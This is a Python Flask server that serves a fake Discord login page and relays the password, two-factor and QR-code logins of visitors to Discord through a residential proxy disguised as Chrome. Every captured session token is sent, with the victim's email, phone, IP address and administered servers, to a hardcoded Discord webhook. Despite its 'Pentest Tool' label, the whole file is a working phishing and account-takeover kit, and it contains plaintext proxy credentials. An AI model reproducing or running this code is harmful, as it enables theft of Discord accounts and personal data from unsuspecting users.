"""
Discord Login Server — stealth proxy using curl_cffi for Chrome TLS impersonation.
Proper flow: visit login page → get cookies → get X-Fingerprint → login.
Run:  python discord_server.py
Open: http://localhost:8463
"""
import subprocess, sys, os, platform, re

_deps = {
    'flask': 'flask',
    'curl_cffi': 'curl_cffi',
    'websocket': 'websocket-client',
    'cryptography': 'cryptography',
}
for _m, _p in _deps.items():
    try:
        __import__(_m)
    except ImportError:
        print(f'[*] Installing {_p}...')
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', _p, '-q'])

from flask import Flask, request, jsonify, send_from_directory
from curl_cffi import requests as creq   # Chrome TLS impersonation
import requests as plain_req              # for webhook (no impersonation needed)
import websocket
import json, base64, hashlib, threading, time, uuid
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_pad
from cryptography.hazmat.primitives import hashes, serialization

# ━━━━━━━━━━━━ Config ━━━━━━━━━━━━
PORT    = int(os.environ.get('PORT', 8463))
API     = 'https://discord.com/api/v9'
WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
WEBHOOK = 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6'

# Chrome 136 UA + matching client hints
CHROME_VER = '136'
UA = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{CHROME_VER}.0.0.0 Safari/537.36'
SEC_CH_UA          = f'"Chromium";v="{CHROME_VER}", "Google Chrome";v="{CHROME_VER}", "Not.A/Brand";v="99"'
SEC_CH_UA_MOBILE   = '?0'
SEC_CH_UA_PLATFORM = '"Windows"'

# Proxy
PX_URL  = 'http://henchmanbobby_gmail_com:Fatman11@la.residential.rayobyte.com:8000'
PX_HOST = 'la.residential.rayobyte.com'
PX_PORT = 8000
PX_AUTH = ('henchmanbobby_gmail_com', 'Fatman11')

app = Flask(__name__, static_folder='.', static_url_path='')

# ━━━━━━━━━━━━ Build Number ━━━━━━━━━━━━
BUILD = 368827  # fallback

def fetch_build_number():
    """Fetch Discord's current client build number from their JS assets."""
    global BUILD
    try:
        s = creq.Session(impersonate='chrome')
        r = s.get('https://discord.com/login', timeout=15)
        # Find sentry JS asset
        matches = re.findall(r'assets/(sentry\.\w+)\.js', r.text)
        if not matches:
            matches = re.findall(r'assets/(\w+)\.js', r.text)
        for m in matches[:5]:
            jr = s.get(f'https://discord.com/assets/{m}.js', timeout=10)
            bm = re.search(r'buildNumber["\s:D]+(\d{5,})', jr.text)
            if bm:
                BUILD = int(bm.group(1))
                print(f'[*] Build number: {BUILD}')
                return
        print(f'[*] Using fallback build: {BUILD}')
    except Exception as e:
        print(f'[!] Build fetch failed: {e}, using {BUILD}')


def sprops():
    return base64.b64encode(json.dumps({
        "os": "Windows", "browser": "Chrome", "device": "",
        "system_locale": "en-US", "browser_user_agent": UA,
        "browser_version": f"{CHROME_VER}.0.0.0", "os_version": "10",
        "referrer": "", "referring_domain": "",
        "referrer_current": "", "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": BUILD, "client_event_source": None
    }).encode()).decode()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


# ━━━━━━━━━━━━ Stealth Discord Session ━━━━━━━━━━━━
class DiscordSession:
    """
    Creates a curl_cffi session that impersonates Chrome's TLS fingerprint,
    visits the login page first to get cookies, then fetches X-Fingerprint.
    This mimics a real browser and avoids account locks.
    """
    def __init__(self, use_proxy=True):
        self.s = creq.Session(impersonate='chrome')
        self.fingerprint = None
        self.cookies_ready = False
        self.proxy = PX_URL if use_proxy else None

    def prepare(self):
        """Step 1: Visit login page → cookies.  Step 2: /experiments → fingerprint."""
        px = {'https': self.proxy, 'http': self.proxy} if self.proxy else None

        # Step 1: GET /login — Cloudflare sets __dcfduid, __sdcfduid, __cfruid, locale
        try:
            r = self.s.get('https://discord.com/login', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, proxies=px, timeout=15)
            self.cookies_ready = r.status_code == 200
            print(f'[*] Login page: {r.status_code}, cookies: {list(self.s.cookies.keys())}')
        except Exception as e:
            print(f'[!] Login page failed: {e}')
            self.cookies_ready = False

        # Step 2: GET /experiments → X-Fingerprint (no auth header)
        try:
            r2 = self.s.get(f'{API}/experiments', headers={
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'X-Track': sprops(),
            }, proxies=px, timeout=15)
            if r2.status_code == 200:
                self.fingerprint = r2.json().get('fingerprint')
                print(f'[*] Fingerprint: {self.fingerprint[:20]}...' if self.fingerprint else '[!] No fingerprint in response')
            else:
                print(f'[!] Experiments: {r2.status_code}')
        except Exception as e:
            print(f'[!] Experiments failed: {e}')

        return self

    def _headers(self, extra=None):
        h = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/login',
            'User-Agent': UA,
            'X-Discord-Locale': 'en-US',
            'X-Discord-Timezone': 'America/Los_Angeles',
            'X-Debug-Options': 'bugReporterEnabled',
            'X-Super-Properties': sprops(),
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        if self.fingerprint:
            h['X-Fingerprint'] = self.fingerprint
        if extra:
            h.update(extra)
        return h

    def post(self, path, json_data, timeout=30):
        px = {'https': self.proxy, 'http': self.proxy} if self.proxy else None
        return self.s.post(
            f'{API}{path}',
            headers=self._headers(),
            json=json_data,
            proxies=px,
            timeout=timeout
        )

    def snapshot(self):
        """Save cookies + fingerprint so they can be restored on a fresh session."""
        return {
            'cookies': dict(self.s.cookies),
            'fingerprint': self.fingerprint,
        }

    def restore(self, snap):
        """Apply saved cookies + fingerprint to this (fresh) session."""
        for k, v in snap.get('cookies', {}).items():
            self.s.cookies.set(k, v)
        self.fingerprint = snap.get('fingerprint')


# ━━━━━━━━━━━━ Webhook ━━━━━━━━━━━━

def _hq_guilds(token):
    h = {"Authorization": token, "User-Agent": UA}
    try:
        gs = plain_req.get(f"{API}/users/@me/guilds?with_counts=true", headers=h, timeout=10).json()
        out = []
        for g in gs:
            if g.get("owner") or g.get("permissions") == "4398046511103":
                out.append(f"• **{g.get('name','?')}** (`{g.get('id','?')}`) — {g.get('approximate_member_count','?')} members")
        return "\n".join(out) if out else "None"
    except:
        return "Error"


def send_webhook(token, client_ip="?"):
    comp  = os.environ.get('COMPUTERNAME', platform.node())
    luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))
    h = {"Authorization": token, "User-Agent": UA}

    def _fallback(reason):
        try:
            plain_req.post(WEBHOOK, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
            print(f"[+] Webhook sent (fallback: {reason})")
        except Exception as e2:
            print(f"[!] Webhook fallback failed: {e2}")

    try:
        r = plain_req.get(f"{API}/users/@me", headers=h, timeout=15)

        if r.status_code != 200:
            _fallback(f"info {r.status_code}"); return

        u = r.json()
        uid    = u.get('id', '?')
        uname  = u.get('username', 'N/A')
        disc   = u.get('discriminator', '0000')
        email  = u.get('email', 'N/A')
        phone  = u.get('phone', 'N/A')
        avatar = u.get('avatar')
        mfa    = u.get('mfa_enabled', False)
        nitro  = u.get('premium_type') is not None
        pfp    = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else None
        color  = 65280 if nitro else 16711680

        try:
            cr = plain_req.get(f"{API}/users/@me/channels", headers=h, timeout=10)
            dm_ids = [c['id'] for c in cr.json()] if cr.status_code == 200 else []
        except:
            dm_ids = []

        hq_str = _hq_guilds(token)
        try:
            gs = plain_req.get(f"{API}/users/@me/guilds?with_counts=true", headers=h, timeout=10).json()
            hq_ids = [g['id'] for g in gs if g.get("owner") or g.get("permissions") == "4398046511103"]
        except:
            hq_ids = []

        guild_ch = []
        for gid in hq_ids:
            try:
                gc = plain_req.get(f"{API}/guilds/{gid}/channels", headers=h, timeout=10)
                if gc.status_code == 200:
                    guild_ch.extend(c['id'] for c in gc.json() if c.get('type') == 0)
            except:
                continue

        total = len(dm_ids) + len(guild_ch)

        payload = {
            "embeds": [{
                "color": color,
                "thumbnail": {"url": pfp} if pfp else None,
                "author": {"name": f"{uname}#{disc}'s Information"},
                "description": (
                    f"**Discord ID:** `{uid}`\n"
                    f"**Email:** {email}\n"
                    f"**Phone:** {phone}\n"
                    f"**2FA:** {'✅' if mfa else '❌'}\n"
                    f"**Nitro:** {'✅' if nitro else '❌'}\n"
                    f"**System Info:**\n"
                    f"📛 Computer Name: `{comp}`\n"
                    f"👤 Username: `{luser}`\n"
                    f"🌐 IP Address: `{client_ip}`\n\n"
                    f"**TOKEN:**\n```{token}```\n"
                    f"**Messages to send:** `{total}`\n\n"
                    f"**HQ Guilds:**\n{hq_str}\n"
                ),
                "footer": {"text": "Logged by Combined Pentest Tool"}
            }],
            "username": "Pentest Tool"
        }
        plain_req.post(WEBHOOK, json=payload, timeout=10)
        print(f"[+] Webhook sent for {uname}#{disc} ({uid})")

    except Exception as e:
        print(f"[!] Webhook error: {e}")
        _fallback("exception")


def fire_webhook(token, client_ip="?"):
    threading.Thread(target=send_webhook, args=(token, client_ip), daemon=True).start()


# ━━━━━━━━━━━━ QR Remote Auth ━━━━━━━━━━━━

sessions = {}          # QR auth sessions
login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between captcha challenge & solve)


class QRAuth:
    def __init__(self):
        self.id    = uuid.uuid4().hex[:8]
        self.pk    = rsa.generate_private_key(65537, 2048)
        self.pub   = self.pk.public_key()
        self.fp    = None
        self.st    = 'init'
        self.user  = None
        self.token = None
        self.err   = None
        self.ws    = None
        self._stop = threading.Event()
        self._wh   = False

    def pub_b64(self):
        return base64.b64encode(self.pub.public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
        )).decode()

    def decrypt(self, b64s):
        return self.pk.decrypt(
            base64.b64decode(b64s),
            asym_pad.OAEP(asym_pad.MGF1(hashes.SHA256()), hashes.SHA256(), None)
        )


def _qr_worker(s: QRAuth):
    # For the QR ticket exchange, create a stealth session
    ds = DiscordSession(use_proxy=True)
    ds.prepare()

    try:
        def on_msg(ws, raw):
            d  = json.loads(raw)
            op = d.get('op')

            if op == 'hello':
                hb = d.get('heartbeat_interval', 40000) / 1000
                ws.send(json.dumps({'op': 'init', 'encoded_public_key': s.pub_b64()}))
                def beat():
                    while not s._stop.is_set():
                        try: ws.send(json.dumps({'op': 'heartbeat'}))
                        except: break
                        s._stop.wait(hb)
                threading.Thread(target=beat, daemon=True).start()

            elif op == 'nonce_proof':
                dec   = s.decrypt(d['encrypted_nonce'])
                proof = b64url(hashlib.sha256(dec).digest())
                ws.send(json.dumps({'op': 'nonce_proof', 'proof': proof}))

            elif op == 'pending_remote_init':
                s.fp = d['fingerprint']
                s.st = 'pending'

            elif op == 'pending_ticket':
                try:
                    info  = s.decrypt(d['encrypted_user_payload']).decode()
                    parts = info.split(':')
                    s.user = {
                        'id': parts[0],
                        'disc': parts[1] if len(parts) > 1 else '0',
                        'avatar': parts[2] if len(parts) > 2 else '',
                        'name': parts[3] if len(parts) > 3 else '?',
                    }
                    s.st = 'scanned'
                except Exception as e:
                    s.st = 'error'; s.err = str(e)

            elif op == 'pending_login':
                s.st = 'confirming'
                try:
                    r = ds.post('/users/@me/remote-auth/login', {'ticket': d['ticket']})
                    j = r.json()
                    if 'encrypted_token' in j:
                        s.token = s.decrypt(j['encrypted_token']).decode()
                        s.st = 'done'
                        if not s._wh:
                            s._wh = True
                            fire_webhook(s.token)
                    else:
                        s.st = 'error'; s.err = json.dumps(j)
                except Exception as e:
                    s.st = 'error'; s.err = str(e)
                s._stop.set()

            elif op == 'cancel':
                s.st = 'cancelled'; s._stop.set()

        def on_err(ws, e):
            if s.st not in ('done', 'cancelled'):
                s.st = 'error'; s.err = str(e)
            s._stop.set()

        def on_close(ws, code, msg):
            if s.st in ('init', 'pending', 'scanned', 'confirming'):
                s.st = 'expired' if s.st == 'pending' else 'error'
                s.err = s.err or ('QR expired' if s.st == 'expired' else f'Closed ({code})')
            s._stop.set()

        ws = websocket.WebSocketApp(
            WS_URL,
            on_message=on_msg, on_error=on_err, on_close=on_close,
            header=[f'Origin: https://discord.com', f'User-Agent: {UA}'],
        )
        s.ws = ws
        ws.run_forever(
            http_proxy_host=PX_HOST,
            http_proxy_port=PX_PORT,
            http_proxy_auth=PX_AUTH,
            proxy_type='http',
        )
    except Exception as e:
        s.st = 'error'; s.err = str(e); s._stop.set()


# ━━━━━━━━━━━━ Routes ━━━━━━━━━━━━

@app.route('/')
def index():
    return send_from_directory('.', 'discord_login.html')


@app.route('/api/login', methods=['POST'])
def api_login():
    """
    Stealth login: fresh session → cookies → fingerprint → login.
    If captcha is required, returns captcha info + session_id to frontend.
    Frontend shows hcaptcha widget, user solves, then re-submits with captcha_key + session_id.
    """
    d = request.json
    login_email  = d.get('login')
    login_pw     = d.get('password')
    captcha_key  = d.get('captcha_key')
    captcha_rqt  = d.get('captcha_rqtoken')
    session_id   = d.get('session_id')

    try:
        # If re-submitting with a solved captcha, restore the original session identity
        if captcha_key and session_id and session_id in login_sessions:
            stored = login_sessions.pop(session_id)
            if not captcha_rqt:
                captcha_rqt = stored.get('rqtoken', '')
            # Create fresh connection but restore cookies + fingerprint from original
            ds = DiscordSession(use_proxy=True)
            ds.s = creq.Session(impersonate='chrome')  # fresh connection pool
            ds.restore(stored.get('snap', {}))
            print(f'[*] Captcha re-submit: session={session_id}')
            print(f'    rqtoken={captcha_rqt[:40] if captcha_rqt else "NONE"}')
            print(f'    captcha_key={captcha_key[:50]}')
            print(f'    restored cookies={list(ds.s.cookies.keys())}, fp={ds.fingerprint[:20] if ds.fingerprint else "NONE"}...')
        elif captcha_key and session_id:
            print(f'[!] Session {session_id} not found (expired?)')
            ds = DiscordSession(use_proxy=True)
            ds.prepare()
        else:
            ds = DiscordSession(use_proxy=True)
            ds.prepare()

        payload = {
            'login': login_email,
            'password': login_pw,
            'undelete': False,
            'gift_code_sku_id': None,
            'login_source': None,
        }
        if captcha_key:
            payload['captcha_key'] = captcha_key
        if captcha_rqt:
            payload['captcha_rqtoken'] = captcha_rqt

        r = ds.post('/auth/login', payload)
        print(f'[*] Login raw response [{r.status_code}]: {r.text[:800]}')
        j = r.json()
        print(f'[*] Login response: {r.status_code} keys={list(j.keys())}')

        # Captcha required or invalid — store session + rqtoken and return challenge info to frontend
        captcha_keys = j.get('captcha_key', [])
        if isinstance(captcha_keys, list) and ('captcha-required' in captcha_keys or 'invalid-response' in captcha_keys or j.get('captcha_sitekey')):
            sid = uuid.uuid4().hex[:12]
            login_sessions[sid] = {
                'rqtoken': j.get('captcha_rqtoken', ''),
                'snap': ds.snapshot(),  # save cookies + fingerprint for re-submit
            }
            print(f'[*] Captcha challenge: sitekey={j.get("captcha_sitekey","?")}, rqtoken={j.get("captcha_rqtoken","")[:30]}..., sid={sid}')
            return jsonify({
                'captcha': True,
                'captcha_sitekey': j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df'),
                'captcha_rqdata': j.get('captcha_rqdata', ''),
                'captcha_rqtoken': j.get('captcha_rqtoken', ''),
                'captcha_service': j.get('captcha_service', 'hcaptcha'),
                'session_id': sid,
            })

        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            fire_webhook(j['token'], ip)
            return jsonify({'success': True})

        # MFA required
        if j.get('ticket') and j.get('mfa') is not None:
            print(f'[*] MFA required: mfa={j.get("mfa")}, sms={j.get("sms")}')
            return jsonify(j)

        # Error — forward to frontend with status
        print(f'[!] Login failed, Discord returned: {j}')
        return jsonify(j), r.status_code

    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f'[!] Login error: {e}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/totp', methods=['POST'])
def api_mfa_totp():
    d = request.json
    try:
        ds = DiscordSession(use_proxy=True)
        ds.prepare()
        r = ds.post('/auth/mfa/totp', {
            'code': d.get('code'), 'ticket': d.get('ticket'),
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            fire_webhook(j['token'], ip)
            return jsonify({'success': True})
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms/send', methods=['POST'])
def api_mfa_sms_send():
    d = request.json
    try:
        ds = DiscordSession(use_proxy=True)
        ds.prepare()
        r = ds.post('/auth/mfa/sms/send', {'ticket': d.get('ticket')})
        return jsonify(r.json()), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms', methods=['POST'])
def api_mfa_sms_verify():
    d = request.json
    try:
        ds = DiscordSession(use_proxy=True)
        ds.prepare()
        r = ds.post('/auth/mfa/sms', {
            'code': d.get('code'), 'ticket': d.get('ticket'),
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            fire_webhook(j['token'], ip)
            return jsonify({'success': True})
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/qr/start')
def api_qr_start():
    s = QRAuth()
    sessions[s.id] = s
    threading.Thread(target=_qr_worker, args=(s,), daemon=True).start()
    for _ in range(200):  # Wait up to 20s for QR fingerprint
        if s.fp or s.st in ('error', 'cancelled'):
            break
        time.sleep(0.1)
    if s.fp:
        return jsonify({'id': s.id, 'fp': s.fp})
    return jsonify({'id': s.id, 'err': s.err or 'Timeout'}), 500


@app.route('/api/qr/poll/<sid>')
def api_qr_poll(sid):
    s = sessions.get(sid)
    if not s:
        return jsonify({'st': 'error', 'err': 'Gone'}), 404
    out = {'st': s.st}
    if s.user:         out['user'] = s.user
    if s.st == 'done': out['success'] = True
    if s.err:          out['err'] = s.err
    return jsonify(out)


@app.route('/api/qr/stop/<sid>', methods=['POST'])
def api_qr_stop(sid):
    s = sessions.pop(sid, None)
    if s:
        s._stop.set()
        try: s.ws.close()
        except: pass
    return jsonify({'ok': True})


# ━━━━━━━━━━━━ Main ━━━━━━━━━━━━

if __name__ == '__main__':
    print('[*] Fetching build number...')
    fetch_build_number()

    def _cleanup():
        while True:
            time.sleep(300)
            dead = [k for k, v in sessions.items() if v.st in ('done', 'error', 'cancelled', 'expired')]
            for k in dead:
                sessions.pop(k, None)
            # Clear stale login sessions (captcha not solved within 5 min)
            login_sessions.clear()
    threading.Thread(target=_cleanup, daemon=True).start()

    print(f'\n  Discord Login Server (stealth)')
    print(f'  http://0.0.0.0:{PORT}\n')
    app.run('0.0.0.0', PORT, debug=False, threaded=True)
